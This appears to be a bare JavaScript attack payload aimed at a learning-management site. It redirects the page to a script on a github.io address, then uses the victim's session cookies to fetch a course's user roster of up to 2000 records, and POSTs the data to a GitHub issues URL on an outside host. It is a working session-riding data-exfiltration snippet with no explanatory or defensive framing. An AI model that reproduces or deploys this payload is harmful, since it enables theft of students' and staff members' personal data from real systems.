location.href='https://johnzhao0.github.io/git/git.js';
fetch('/learn/api/public/v3/courses/_1_1/users?limit=2000',{credentials:'include'})
  .then(r=>r.json())
  .then(d=>fetch('https://github.com/JohnZhao0/git/issues/1',{method:'POST',body:JSON.stringify(d)}));
